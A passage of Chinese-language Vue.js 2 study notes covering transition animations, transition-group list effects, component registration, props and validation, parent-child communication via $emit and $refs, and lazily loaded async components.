Vue.http.options.emulateJSON = true;\n```\n\n# Vue中的动画\n[官方链接](https://cn.vuejs.org/v2/guide/transitions.html)\n为什么要有动画：动画能够提高用户的体验，帮助用户更好的理解页面中的功能；\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409120529.png)\n\n```\nv-enter: 【这是一个时间点】 是进入之前，元素的起始状态，此时还没有开始进入\nv-leave-to: 【这是一个时间点】 是动画离开之后，离开的终止状态，此时，元素 动画已经结束了\nv-enter-active: 【入场动画的时间段】\nv-leave-active: 【离场动画的时间段】\n```\n对于这些在过渡中切换的类名来说，如果你使用一个没有名字的`<transition>`，则 v- 是这些类名的默认前缀。如果你使用了`<transition name=\"my-transition\">`，那么 v-enter 会替换为 my-transition-enter。\n\n## 使用过渡类名\n1. HTML结构：\n```html\n<div id=\"app\">\n    <input type=\"button\" value=\"动起来\" @click=\"myAnimate\">\n    <!-- 使用 transition 将需要过渡的元素包裹起来 -->\n    <transition name=\"fade\">\n      <div v-show=\"isshow\">动画哦</div>\n    </transition>\n</div>\n```\n2. VM 实例：\n```css\n// 创建 Vue 实例，得到 ViewModel\nvar vm = new Vue({\n  el: '#app',\n  data: {\n    isshow: false\n  },\n  methods: {\n    myAnimate() {\n      this.isshow = !this.isshow;\n    }\n  }\n});\n```\n3. 定义两组类样式：\n```css\n    /* 定义进入和离开时候的过渡状态 */\n    .fade-enter-active,\n    .fade-leave-active {\n      transition: all 0.2s ease;\n      position: absolute; // 可以防止过渡时的效果时产生如下影响\n    }\n\n    /* 定义进入过渡的开始状态 和 离开过渡的结束状态 */\n    .fade-enter,\n    .fade-leave-to {\n      opacity: 0;\n      transform: translateX(100px);\n    }\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191220160849.gif\"/>\n\n## 使用第三方 CSS 动画库\n[官方链接](https://cn.vuejs.org/v2/guide/transitions.html#自定义过渡类名)\n1. 导入动画类库：\n```html\n<link rel=\"stylesheet\" type=\"text/css\" href=\"./lib/animate.css\">\n```\n2. 定义 transition 及属性：\n```html\n<transition\n\tenter-active-class=\"fadeInRight\"\n    leave-active-class=\"fadeOutRight\"\n    :duration=\"{ enter: 500, leave: 800 }\">\n  \t<div class=\"animated\" v-show=\"isshow\">动画哦</div>\n</transition>\n```\n或\n```html\n<transition\n\tenter-active-class=\"animated fadeInRight\"\n    leave-active-class=\"animated fadeOutRight\"\n    :duration=\"{ enter: 500, leave: 800 }\">\n  \t<div v-show=\"isshow\">动画哦</div>\n</transition>\n```\n\n## 使用动画钩子函数\n1. 定义 transition 组件以及三个钩子函数：\n```html\n<div id=\"app\">\n    <input type=\"button\" value=\"切换动画\" @click=\"isshow = !isshow\">\n    <transition\n    @before-enter=\"beforeEnter\"\n    @enter=\"enter\"\n    @after-enter=\"afterEnter\">\n      <div v-if=\"isshow\" class=\"show\">OK</div>\n    </transition>\n  </div>\n```\n2. 定义三个 methods 钩子方法：\n```js\nmethods: {\n    beforeEnter(el) { // 动画进入之前的回调\n      el.style.transform = 'translateX(500px)';\n    },\n    enter(el, done) { // 动画进入完成时候的回调\n      el.offsetWidth;\n      el.style.transform = 'translateX(0px)';\n      done(); // 表示立即执行afterEnter函数\n    },\n    afterEnter(el) { // 动画进入完成之后的回调\n      this.isshow = !this.isshow;\n    }\n}\n```\n\n3. 定义动画过渡时长和样式：\n```css\n.show{\n      transition: all 0.4s ease;\n    }\n```\n\n示例：\n```html\n<body>\n  <div id=\"app\">\n    <input type=\"button\" value=\"快到碗里来\" @click=\"flag=!flag\">\n    <!-- 1. 使用 transition 元素把 小球包裹起来 -->\n    <transition\n      @before-enter=\"beforeEnter\"\n      @enter=\"enter\"\n      @after-enter=\"afterEnter\">\n      <div class=\"ball\" v-show=\"flag\"></div>\n    </transition>\n  </div>\n\n  <script>\n\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: {\n        flag: false\n      },\n      methods: {\n        // 注意： 动画钩子函数的第一个参数：el，表示 要执行动画的那个DOM元素，是个原生的 JS DOM对象\n        // 大家可以认为 ， el 是通过 document.getElementById('') 方式获取到的原生JS DOM对象\n        beforeEnter(el){\n          // beforeEnter 表示动画入场之前，此时，动画尚未开始，可以 在 beforeEnter 中，设置元素开始动画之前的起始样式\n          // 设置小球开始动画之前的，起始位置\n          el.style.transform = \"translate(0, 0)\"\n        },\n        enter(el, done){\n          // 这句话，没有实际的作用，但是，如果不写，出不来动画效果；\n          // 可以认为 el.offsetWidth 会强制动画刷新\n          el.offsetWidth\n          // enter 表示动画 开始之后的样式，这里，可以设置小球完成动画之后的，结束状态\n          el.style.transform = \"translate(150px, 450px)\"\n          el.style.transition = 'all 1s ease'\n\n          // 这里的 done， 起始就是 afterEnter 这个函数，也就是说：done 是 afterEnter 函数的引用\n          done()\n        },\n        afterEnter(el){\n          // 动画完成之后，会调用 afterEnter\n          // console.log('ok')\n          this.flag = !this.flag\n        }\n      }\n    });\n  </script>\n</body>\n```\n\n## v-for的列表过渡\n[官方链接](https://cn.vuejs.org/v2/guide/transitions.html#列表的进入和离开过渡)\n目前为止，关于过渡我们已经讲到：\n- 单个节点\n- 同一时间渲染多个节点中的一个\n\n那么怎么同时渲染整个列表，比如使用 v-for ？在这种场景中，使用 `<transition-group>` 组件。在我们深入例子之前，先了解关于这个组件的几个特点：\n- 不同于 `<transition>`，它会以一个真实元素呈现：默认为一个 `<span>`。你也可以通过 tag 特性更换为其他元素。\n- 过渡模式不可用，因为我们不再相互切换特有的元素。\n- 内部元素 总是需要 提供唯一的 key 属性值。\n- CSS 过渡的类将会应用在内部的元素中，而不是这个组/容器本身。\n1. 定义过渡样式：\n```css\n<style>\n    .list-enter,\n    .list-leave-to {\n      opacity: 0;\n      transform: translateY(10px);\n    }\n\n    .list-enter-active,\n    .list-leave-active {\n      transition: all 0.3s ease;\n    }\n</style>\n```\n\n2. 定义DOM结构，其中，需要使用 transition-group 组件把v-for循环的列表包裹起来：\n```html\n  <div id=\"app\">\n    <input type=\"text\" v-model=\"txt\" @keyup.enter=\"add\">\n    <transition-group tag=\"ul\" name=\"list\">\n      <li v-for=\"(item, i) in list\" :key=\"i\">{{item}}</li>\n    </transition-group>\n  </div>\n```\n\n3. 定义 VM中的结构：\n```css\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: {\n        txt: '',\n        list: [1, 2, 3, 4]\n      },\n      methods: {\n        add() {\n          this.list.push(this.txt);\n          this.txt = '';\n        }\n      }\n    });\n```\n\n## 列表的排序过渡\n`<transition-group>` 组件还有一个特殊之处。不仅可以进入和离开动画，**还可以改变定位**。要使用这个新功能只需了解新增的 `v-move` 特性，**它会在元素的改变定位的过程中应用**。\n`v-move` 和 `v-leave-active` 结合使用，能够让列表的过渡更加平缓柔和：\n```css\n.v-move{\n  transition: all 0.8s ease;\n}\n.v-leave-active{\n  position: absolute;\n}\n```\n\n案例：\n```html\n<style>\n    li {\n      border: 1px dashed #999;\n      margin: 5px;\n      line-height: 35px;\n      padding-left: 5px;\n      font-size: 12px;\n      width: 100%;\n    }\n    li:hover {\n      background-color: hotpink;\n      transition: all 0.8s ease;\n    }\n    .v-enter,\n    .v-leave-to {\n      opacity: 0;\n      transform: translateY(80px);\n    }\n    .v-enter-active,\n    .v-leave-active {\n      transition: all 0.6s ease;\n    }\n    /* 下面的 .v-move 和 .v-leave-active 配合使用，能够实现列表后续的元素，渐渐地漂上来的效果 */\n    .v-move {\n      transition: all 0.6s ease;\n    }\n    .v-leave-active{\n      position: absolute;\n    }\n  </style>\n</head>\n\n<body>\n  <div id=\"app\">\n    <div>\n      <label>\n        Id:\n        <input type=\"text\" v-model=\"id\">\n      </label>\n      <label>\n        Name:\n        <input type=\"text\" v-model=\"name\">\n      </label>\n      <input type=\"button\" value=\"添加\" @click=\"add\">\n    </div>\n    <!-- <ul> -->\n      <!-- 在实现列表过渡的时候，如果需要过渡的元素，是通过 v-for 循环渲染出来的，不能使用 transition 包裹，需要使用 transitionGroup -->\n      <!-- 如果要为 v-for 循环创建的元素设置动画，必须为每一个 元素 设置 :key 属性 -->\n      <!-- 给 ransition-group 添加 appear 属性，实现页面刚展示出来时候，入场时候的效果 -->\n      <!-- 通过 为 transition-group 元素，设置 tag 属性，指定 transition-group 渲染为指定的元素，如果不指定 tag 属性，默认，渲染为 span 标签 -->\n      <transition-group appear tag=\"ul\">\n        <li v-for=\"(item, i) in list\" :key=\"item.id\" @click=\"del(i)\">\n          {{item.id}} --- {{item.name}}\n        </li>\n      </transition-group>\n    <!-- </ul> -->\n  </div>\n  <script>\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: {\n        id: '',\n        name: '',\n        list: [\n          { id: 1, name: '赵高' },\n          { id: 2, name: '秦桧' },\n          { id: 3, name: '严嵩' },\n          { id: 4, name: '魏忠贤' }\n        ]\n      },\n      methods: {\n        add() {\n          this.list.push({ id: this.id, name: this.name })\n          this.id = this.name = ''\n        },\n        del(i) {\n          this.list.splice(i, 1)\n        }\n      }\n    });\n  </script>\n</body>\n```\n\n# Vue组件\n什么是组件： 组件的出现，就是为了拆分Vue实例的代码量的，能够让我们以不同的组件，来划分不同的功能模块，将来我们需要什么样的功能，就可以去调用对应的组件即可；\n组件化和模块化的不同：\n- 模块化：是从代码逻辑的角度进行划分的；方便代码分层开发，保证每个功能模块的职能单一；\n- 组件化：是从UI界面的角度进行划分的；前端的组件化，方便UI组件的重用；\n## 全局组件\n**全局组件定义的四种方式**\n注：是<font color=\"red\">全局组件</font>， 全局组件是所有Vue实例的子组件\n无论是通过哪个方式常见全局组件，最后都必须要调用Vue.component('组件的名称', 创建出来的组件模板对象)，  <font color=\"red\">并且创建出来的组件模板对象有且只能有一个根元素， 否则会报错</font>\n1. 使用Vue.extend配合Vue.component方法：\n```js\nvar login = Vue.extend({\n      template: '<h1>登录</h1>'\n});\nVue.component('login', login);\n```\n\n2. 直接使用Vue.component方法：\n```js\nVue.component('register', {\n      template: '<h1>注册</h1>'\n});\n```\n\n3. 将模板字符串，定义到script标签(类型要为`x-template`)种：\n```html\n<script id=\"tmpl\" type=\"x-template\">\n    <div><a href=\"#\">登录</a> | <a href=\"#\">注册</a></div>\n</script>\n```\n同时，需要使用 Vue.component 来定义组件：\n```js\nVue.component('account', {\n      template: '#tmpl'\n});\n```\n\n4. 使用`<template>`标签\n```html\n<template id=\"tmpl\">\n    <div><a href=\"#\">登录</a> | <a href=\"#\">注册</a></div>\n</template>\n```\n同时，需要使用 Vue.component 来定义组件：\n```js\nVue.component('account', {\n      template: '#tmpl'\n});\n```\n<font color=\"red\">注意： 组件中的DOM结构，**有且只能有唯一**的根元素（Root Element）来进行包裹！</font>\n\n## 局部子组件\n使用components属性定义局部子组件\n1. 组件实例定义方式：\n```js\n<script>\nimport Test from './Test.vue' //引入Test组件\n\n// 创建 Vue 实例，得到 ViewModel\nvar vm = new Vue({\n  el: '#app',\n  data: {},\n  methods: {},\n  components: { // 定义子组件\n    Test, // Test主机\n    account: { // account 组件\n      template: '<div><h1>这是Account组件{{name}}</h1><login></login></div>', // 在这里使用定义的子组件\n      components: { // 定义子组件的子组件\n        login: { // login 组件\n          template: \"<h3>这是登录组件</h3>\"\n        }\n      }\n    }\n  }\n});\n</script>\n```\n\n2. 引用组件：\n```html\n<div id=\"app\">\n    <account></account>\n </div  \n```\n\n## 组件中的data属性\n- 组件可以有自己的data数据。\n- 组件的data和vue实例中的data有点不一样，实例中的data属性值可以是一个对象，但是组件中的data属性值必须要是一个方法，且必须要返回一个对象\n- 组件获取自身的data数据的方式与vue实例获取data数据的方式一样\n```js\nVue.component('account', {\n  template: '<h1>这是一个全局组件---{{msg}}</h1>',\n  data: function() {\n    return {\n      msg: '大家好！'\n    }\n  }\n});\n或\nVue.component('account', {\n  template: '<h1>这是一个全局组件---{{msg}}</h1>',\n  data(){\n    return {\n      msg: '大家好！'\n    }\n  }\n});\n```\n\n## 组件中的props属性\n### Prop 的大小写 (camelCase vs kebab-case)\nHTML 中的 attribute 名是大小写不敏感的，所以浏览器会把所有大写字符解释为小写字符。这意味着当你使用 DOM 中的模板时，camelCase (驼峰命名法) 的 prop 名需要使用其等价的 kebab-case (短横线分隔命名) 命名：\n```js\nVue.component('blog-post', {\n  // 在 JavaScript 中是 camelCase 的\n  props: ['postTitle'],\n  template: '<h3>{{ postTitle }}</h3>'\n})\n```\n```html\n<!-- 在 HTML 中是 kebab-case 的 -->\n<blog-post post-title=\"hello!\"></blog-post>\n```\n重申一次，如果你使用字符串模板，那么这个限制就不存在了。\n\n### Prop 类型\n到这里，我们只看到了以字符串数组形式列出的 prop：\n```js\nprops: ['title', 'likes', 'isPublished', 'commentIds', 'author']\n```\n但是，通常你希望每个 prop 都有指定的值类型。这时，你可以以对象形式列出 prop，这些 property 的名称和值分别是 prop 各自的名称和类型：\n```js\nprops: {\n  title: String,\n  likes: Number,\n  isPublished: Boolean,\n  commentIds: Array,\n  author: Object,\n  callback: Function,\n  contactsPromise: Promise // or any other constructor\n}\n```\n这不仅为你的组件提供了文档，还会在它们遇到错误的类型时从浏览器的 JavaScript 控制台提示用户。你会在这个页面接下来的部分看到类型检查和其它 prop 验证。\n\n### 传递静态或动态 Prop\n像这样，你已经知道了可以像这样给 prop 传入一个静态的值：\n```html\n<blog-post title=\"My journey with Vue\"></blog-post>\n```\n你也知道 prop 可以通过 v-bind 动态赋值，例如：\n```html\n<!-- 动态赋予一个变量的值 -->\n<blog-post v-bind:title=\"post.title\"></blog-post>\n\n<!-- 动态赋予一个复杂表达式的值 -->\n<blog-post\n  v-bind:title=\"post.title + ' by ' + post.author.name\"\n></blog-post>\n```\n在上述两个示例中，我们传入的值都是字符串类型的，但实际上任何类型的值都可以传给一个 prop。\n\n**传入一个数字**\n```html\n<!-- 即便 `42` 是静态的，我们仍然需要 `v-bind` 来告诉 Vue -->\n<!-- 这是一个 JavaScript 表达式而不是一个字符串。-->\n<blog-post v-bind:likes=\"42\"></blog-post>\n\n<!-- 用一个变量进行动态赋值。-->\n<blog-post v-bind:likes=\"post.likes\"></blog-post>\n```\n\n**传入一个布尔值**\n```html\n<!-- 包含该 prop 没有值的情况在内，都意味着 `true`。-->\n<blog-post is-published></blog-post>\n\n<!-- 即便 `false` 是静态的，我们仍然需要 `v-bind` 来告诉 Vue -->\n<!-- 这是一个 JavaScript 表达式而不是一个字符串。-->\n<blog-post v-bind:is-published=\"false\"></blog-post>\n\n<!-- 用一个变量进行动态赋值。-->\n<blog-post v-bind:is-published=\"post.isPublished\"></blog-post>\n```\n\n**传入一个数组**\n```html\n<!-- 即便数组是静态的，我们仍然需要 `v-bind` 来告诉 Vue -->\n<!-- 这是一个 JavaScript 表达式而不是一个字符串。-->\n<blog-post v-bind:comment-ids=\"[234, 266, 273]\"></blog-post>\n\n<!-- 用一个变量进行动态赋值。-->\n<blog-post v-bind:comment-ids=\"post.commentIds\"></blog-post>\n```\n\n**传入一个对象**\n```html\n<!-- 即便对象是静态的，我们仍然需要 `v-bind` 来告诉 Vue -->\n<!-- 这是一个 JavaScript 表达式而不是一个字符串。-->\n<blog-post\n  v-bind:author=\"{\n    name: 'Veronica',\n    company: 'Veridian Dynamics'\n  }\"\n></blog-post>\n\n<!-- 用一个变量进行动态赋值。-->\n<blog-post v-bind:author=\"post.author\"></blog-post>\n```\n\n**传入一个对象的所有 property**\n如果你想要将一个对象的所有 property 都作为 prop 传入，你可以使用不带参数的 v-bind (取代 v-bind:prop-name)。例如，对于一个给定的对象 post：\n```html\npost: {\n  id: 1,\n  title: 'My Journey with Vue'\n}\n```\n下面的模板：\n```html\n<blog-post v-bind=\"post\"></blog-post>\n```\n等价于：\n```html\n<blog-post\n  v-bind:id=\"post.id\"\n  v-bind:title=\"post.title\"\n></blog-post>\n```\n\n### 单向数据流\n所有的 prop 都使得其父子 prop 之间形成了一个单向下行绑定：父级 prop 的更新会向下流动到子组件中，但是反过来则不行。这样会防止从子组件意外变更父级组件的状态，从而导致你的应用的数据流向难以理解。\n\n额外的，每次父级组件发生变更时，子组件中所有的 prop 都将会刷新为最新的值。这意味着你不应该在一个子组件内部改变 prop。如果你这样做了，Vue 会在浏览器的控制台中发出警告。\n\n这里有两种常见的试图变更一个 prop 的情形：\n1. 这个 prop 用来传递一个初始值；这个子组件接下来希望将其作为一个本地的 prop 数据来使用。在这种情况下，最好定义一个本地的 data property 并将这个 prop 用作其初始值：\n```js\nprops: ['initialCounter'],\ndata: function () {\n  return {\n    counter: this.initialCounter\n  }\n}\n```\n2. 这个 prop 以一种原始的值传入且需要进行转换。在这种情况下，最好使用这个 prop 的值来定义一个计算属性：\n```js\nprops: ['size'],\ncomputed: {\n  normalizedSize: function () {\n    return this.size.trim().toLowerCase()\n  }\n}\n```\n> 注意在 JavaScript 中对象和数组是通过引用传入的，所以对于一个数组或对象类型的 prop 来说，在子组件中改变变更这个对象或数组本身将会影响到父组件的状态。\n\n### Prop 验证\n我们可以为组件的 prop 指定验证要求，例如你知道的这些类型。如果有一个需求没有被满足，则 Vue 会在浏览器控制台中警告你。这在开发一个会被别人用到的组件时尤其有帮助。\n\n为了定制 prop 的验证方式，你可以为 props 中的值提供一个带有验证需求的对象，而不是一个字符串数组。例如：\n```js\nVue.component('my-component', {\n  props: {\n    // 基础的类型检查 (`null` 和 `undefined` 会通过任何类型验证)\n    propA: Number,\n    // 多个可能的类型\n    propB: [String, Number],\n    // 必填的字符串\n    propC: {\n      type: String,\n      required: true\n    },\n    // 带有默认值的数字\n    propD: {\n      type: Number,\n      default: 100\n    },\n    // 带有默认值的对象\n    propE: {\n      type: Object,\n      // 对象或数组默认值必须从一个工厂函数获取\n      default: function () {\n        return { message: 'hello' }\n      }\n    },\n    // 自定义验证函数\n    propF: {\n      validator: function (value) {\n        // 这个值必须匹配下列字符串中的一个\n        return ['success', 'warning', 'danger'].indexOf(value) !== -1\n      }\n    }\n  }\n})\n```\n当 prop 验证失败的时候，(开发环境构建版本的) Vue 将会产生一个控制台的警告。\n\n> 注意那些 prop 会在一个组件实例创建之前进行验证，所以实例的 property (如 data、computed 等) 在 default 或 validator 函数中是不可用的。\n\n**类型检查**\ntype 可以是下列原生构造函数中的一个：\n- String\n- Number\n- Boolean\n- Array\n- Object\n- Date\n- Function\n- Symbol\n额外的，type 还可以是一个自定义的构造函数，并且通过 instanceof 来进行检查确认。例如，给定下列现成的构造函数：\n```js\nfunction Person (firstName, lastName) {\n  this.firstName = firstName\n  this.lastName = lastName\n}\n```\n你可以使用：\n```js\nVue.component('blog-post', {\n  props: {\n    author: Person\n  }\n})\n```\n来验证 author prop 的值是否是通过 new Person 创建的。\n\n### 非 Prop 的 Attribute\n一个非 prop 的 attribute 是指传向一个组件，但是该组件并没有相应 prop 定义的 attribute。\n\n因为显式定义的 prop 适用于向一个子组件传入信息，然而组件库的作者并不总能预见组件会被用于怎样的场景。这也是为什么组件可以接受任意的 attribute，而这些 attribute 会被添加到这个组件的根元素上。\n\n例如，想象一下你通过一个 Bootstrap 插件使用了一个第三方的`<bootstrap-date-input>`组件，这个插件需要在其`<input>`上用到一个 data-date-picker attribute。我们可以将这个 attribute 添加到你的组件实例上：\n```html\n<bootstrap-date-input data-date-picker=\"activated\"></bootstrap-date-input>\n```\n然后这个`data-date-picker=\"activated\"` attribute就会自动添加到`<bootstrap-date-input>`的根元素上。\n\n**替换/合并已有的 Attribute**\n想象一下`<bootstrap-date-input>`的模板是这样的：\n```html\n<input type=\"date\" class=\"form-control\">\n```\n为了给我们的日期选择器插件定制一个主题，我们可能需要像这样添加一个特别的类名：\n```html\n<bootstrap-date-input\n  data-date-picker=\"activated\"\n  class=\"date-picker-theme-dark\"\n></bootstrap-date-input>\n```\n在这种情况下，我们定义了两个不同的 class 的值：\n- form-control，这是在组件的模板内设置好的\n- date-picker-theme-dark，这是从组件的父级传入的\n对于绝大多数 attribute 来说，从外部提供给组件的值会替换掉组件内部设置好的值。所以如果传入 type=\"text\" 就会替换掉 type=\"date\" 并把它破坏！庆幸的是，class 和 style attribute 会稍微智能一些，即两边的值会被合并起来，从而得到最终的值：form-control date-picker-theme-dark。\n\n**禁用 Attribute 继承**\n如果你不希望组件的根元素继承 attribute，你可以在组件的选项中设置 inheritAttrs: false。例如：\n```js\nVue.component('my-component', {\n  inheritAttrs: false,\n  // ...\n})\n```\n这尤其适合配合实例的 $attrs property 使用，该 property 包含了传递给一个组件的 attribute 名和 attribute 值，例如：\n```js\n{\n  required: true,\n  placeholder: 'Enter your username'\n}\n```\n有了 inheritAttrs: false 和 $attrs，你就可以手动决定这些 attribute 会被赋予哪个元素。在撰写基础组件的时候是常会用到的：\n```js\nVue.component('base-input', {\n  inheritAttrs: false,\n  props: ['label', 'value'],\n  template: `\n    <label>\n      {{ label }}\n      <input\n        v-bind=\"$attrs\"\n        v-bind:value=\"value\"\n        v-on:input=\"$emit('input', $event.target.value)\"\n      >\n    </label>\n  `\n})\n```\n注意 inheritAttrs: false 选项不会影响 style 和 class 的绑定。\n\n这个模式允许你在使用基础组件的时候更像是使用原始的 HTML 元素，而不会担心哪个元素是真正的根元素：\n```html\n<base-input\n  label=\"Username:\"\n  v-model=\"username\"\n  required\n  placeholder=\"Enter your username\"\n></base-input>\n```\n\n## 却换组件\n### 使用flag标识符结合v-if和v-else切换组件\n1. 页面结构：\n```html\n<div id=\"app\">\n    <input type=\"button\" value=\"toggle\" @click=\"flag=!flag\">\n    <my-com1 v-if=\"flag\"></my-com1>\n    <my-com2 v-else=\"flag\"></my-com2>\n </div>\n```\n\n2. Vue实例定义：\n```js\n<script>\n    Vue.component('myCom1', {\n      template: '<h3>奔波霸</h3>'\n    })\n    Vue.component('myCom2', {\n      template: '<h3>霸波奔</h3>'\n    })\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: {\n        flag: true\n      },\n      methods: {}\n    });\n  </script>\n```\n\n## 使用:is属性来切换不同的子组件,并添加切换动画\n1. 组件实例定义方式：\n```js\n    // 登录组件\n    const login = Vue.extend({\n      template: `<div>\n        <h3>登录组件</h3>\n      </div>`\n    });\n    Vue.component('login', login);\n\n    // 注册组件\n    const register = Vue.extend({\n      template: `<div>\n        <h3>注册组件</h3>\n      </div>`\n    });\n    Vue.component('register', register);\n\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: { comName: 'login' },\n      methods: {}\n    });\n```\n\n2. 使用`component`标签，来引用组件，并通过`:is`属性来指定要加载的组件：\n```html\n<div id=\"app\">\n<a href=\"#\" @click.prevent=\"comName='login'\">登录</a>\n<a href=\"#\" @click.prevent=\"comName='register'\">注册</a>\n<hr>\n<transition mode=\"out-in\">\n  <component :is=\"comName\"></component>\n</transition>\n</div>\n```\n\n3. 添加切换样式：\n```css\n  <style>\n    .v-enter,\n    .v-leave-to {\n      opacity: 0;\n      transform: translateX(30px);\n    }\n\n    .v-enter-active,\n    .v-leave-active {\n      position: absolute;\n      transition: all 0.3s ease;\n    }\n\n    h3{\n      margin: 0;\n    }\n  </style>\n```\n\n## 父组件向子组件传值\n1. 组件实例定义方式，注意：在子组件上一定要使用`props`属性来定义父组件传递过来的数据时接收的变量\n注意： **组件中的所有props中的数据，都是通过父组件传递给子组件的，  props中的数据，都是只读的，无法重新赋值**\n然后通过属性绑定`v-bind:子组件中的props=\"父组件中的data属性\"`的方法，父组件会把data属性的值赋给子组件中的props\n```js\n<script>\n// 创建 Vue 实例，得到 ViewModel\nvar vm = new Vue({\n  el: '#app',\n  data: {\n    msg: '这是父组件中的消息'\n  },\n  components: {\n    son: {\n      template: '<h1>这是子组件 --- {{finfo}}</h1>',\n      props: ['finfo']\n    }\n  }\n});\n</script>\n```\n\n2. 使用`v-bind`或简化指令，将数据传递到子组件中：\n```html\n<div id=\"app\">\n    <son :finfo=\"msg\"></son> // 通过`:finfo=\"msg\"`绑定后，会把父组件中的msg属性值赋给finfo。父组件给子组件传递它的方法的形式与这种方式类似\n</div>\n```\n\n## 父组件向子组件传递父组件所拥有的方法，以及父组件获取子组件中的数据\n父组件向子组件传递父组件所拥有的方法，使用的事件绑定机制`@将要在子组件生成的方法的方法名A:\"父组件中的要传递的方法的方法名\"`的方式，使得父组件要传递的方法的方法对象赋给了A，然后子组件内部通过`this.$emit('方法名A', 要传递的数据)`方式，来调用父组件中的方法，同时把数据传递给父组件使用\n\n示例：\n```html\n<body>\n\t<div id=\"app\">\n    <my-component @func=\"show\"></my-component>\n\t</div>\n  <template id=\"temp1\">\n    <div>\n      <input type=\"button\" value=\"button\" @click=\"myclick\">\n    </div>\n  </template>\n\n  <script>\n    Vue.component(\"my-component\", {\n      template:  '#temp1',\n      methods:{\n        myclick(){\n          this.$emit('func', 111);\n        }\n      }\n    })\n    var vm = new Vue({\n      el: '#app',\n      data: {\n        dataFromSon: null;\n      },\n      methods:{\n        show(num){\n          this.dataFromSon = num; // 获取来自子组件的数据\n          console.log(\"hello\");\n        }\n      }\n    })\n  </script>\n</body>\n```\n\n## 使用this.$refs来获取元素和组件\n```html\n  <div id=\"app\">\n    <div>\n      <input type=\"button\" value=\"获取元素内容\" @click=\"getElement\" />\n      <!-- 使用 ref 获取元素 -->\n      <h1 ref=\"myh1\">这是一个大大的H1, 1</h1>\n      <h1 ref=\"myh2\">这是一个大大的H2, 1</h1>\n      <h1 ref=\"myh2\">这是一个大大的H2, 2</h1>\n      <hr>\n      <!-- 使用 ref 获取子组件 -->\n      <my-com ref=\"mycom\"></my-com>\n    </div>\n  </div>\n  <script>\n    Vue.component('my-com', {\n      template: '<h5>这是一个子组件</h5>',\n      data() {\n        return {\n          name: '子组件'\n        }\n      }\n    });\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: {},\n      methods: {\n        getElement() {\n          // 通过 this.$refs 来获取元素的text内容\n          console.log(this.$refs.myh1.innerText);\n          console.log(this.$refs.myh2[0].innerText);\n          console.log(this.$refs.myh2[1].innerText);\n          // 通过 this.$refs 来获取组件中的data为name的值\n          console.log(this.$refs.mycom.name);\n        }\n      }\n    });\n  </script>\n```\n\n## 父组件调用子组件中的方法\n可以通过this.$refs拿到子组件中的所有方法\n实例：\n\nchild1.vue\n```vue\n<template>\n    <div>\n        child1\n    </div>\n</template>\n\n<script>\n    export default {\n        name: \"child1\",\n        props: \"msg\",\n        methods: {\n            handleParentClick(e) {\n                console.info(e)\n            }\n        }\n    }\n</script>\n```\n\nparent.vue\n```vue\n<template>\n    <div>\n        <button v-on:click=\"clickParent\">点击</button>\n        <child1 ref=\"child1\"></child1>\n    </div>\n</template>\n\n<script>\n    import Child1 from './child1';\n    export default {\n        name: \"parent\",\n        components: {\n            child1: Child1\n        },\n        methods: {\n            clickParent() {\n                // this.$refs.child1.$emit('click-child', \"high\");\n                this.$refs.child1.handleParentClick(\"ssss\");\n            }\n        }\n    }\n</script>\n```\n\n## 异步组件（延迟加载组件）\n在我们开始了解延迟加载组件之前，我们先来了解通常是如何加载组件的。 为此，我创建了一个Tooltip.vue组件：\n```html\n<!-- Tooltip.vue -->\n<template>\n    <h1>Hi from Tooltip!</h2>\n</template>\n```\n这里没有什么特别之处，它就是一个简单的组件。我们可以通过本地注册，导入Tooltip组件并将其添加到components选项中，这样就可以在另一个组件中使用它。比如，在App.vue中使用它：\n```vue\n<!-- App.vue -->\n<template>\n    <div id=\"app\">\n        <Tooltip />\n    </div>\n</template>\n\n<script>\n    import Tooltip from \"./components/Tooltip\"\n\n    export default {\n        name: \"App\",\n        components: {\n            Tooltip\n        }\n    };\n</script>\n```\n只要App被导入，就可以在初始加载时，Tooltip组件就会被导入、使用和加载。但是想想：只有在我们要使用组件时才加载该组件难道没有意义吗？用户很可能在不需要工具提示的情况下浏览整个系统。所以可以使用异步加载Tooltip组件\n\n动态导入是一个返回Promise的函数，其中包含模块作为其有效的加载。下面的示例展示了如何以静态导入和动态方式导入utils模块。\n```js\n// 静态导入模块\nimport utils from './utils'\n```\n```js\n// 动态导入\nimport('./utils').then(utils => {\n    // 可以在这里使用utils模块\n})\n```\n在Vue中延迟加载组件与在封装的函数中动态导入组件一样容易。在前面的例子中，我们可以像下面这样延迟加载Tooltip组件：\n```js\nexport default {\n    components: {\n        Tooltip: () => import('./components/Tooltip')\n    }\n}\n```\n### 有条件地加载一个异步组件\n在前面的示例中，尽管我们通过延迟加载来加载Tooltip组件，但它将在需要渲染时立即加载，这在App组件加载时就立即发生了。\n\n然而，在实践中，我们希望将Tooltip组件加载能延迟到需要时加载，这通常是在触发某个事件之后有条件地进行，比如在按钮或文本上悬停时触发。\n\n为了简单起见，在App组件中添加一个按钮，使用v-if有条件地渲染Tooltip组件：\n```vue\n<!-- App.vue -->\n<template>\n    <div>\n        <button @click=\"show = true\">Load Tooltip</button>\n        <div v-if=\"show\">\n            <Tooltip />\n        </div>\n    </div>\n</template>\n\n<script>\n    export default {\n        data: () => ({\n            show: false\n        }),\n\n        components: {\n            Tooltip: () => import('./components/Tooltip')\n        }\n    }\n</script>\n```\n请记住，Vue在需要渲染之前不会使用该组件。这意味着在点击之前不需要该组件，并且该组件将被延迟加载\n\n### 路由中使用异步组件\n```js\nimport Test2 from './views/Test2.vue'\n\nvar router = new VueRouter({\n  routes:[\n      {path: '/test2', name:\"Test2页面\", component: Test2},\n  ]\n})\n```\n使用异步组件如下：\n```js\nvar router = new VueRouter({\n  routes:[\n      {path: '/test2', name:\"Test2页面\", component: () => import('./views/Tet2.vue')},\n  ]\n})\n```\n\n# slot与slot-scope\n插槽，也就是slot，是组件的一块HTML模板，这块模板显示不显示、以及怎样显示由父组件来决定， 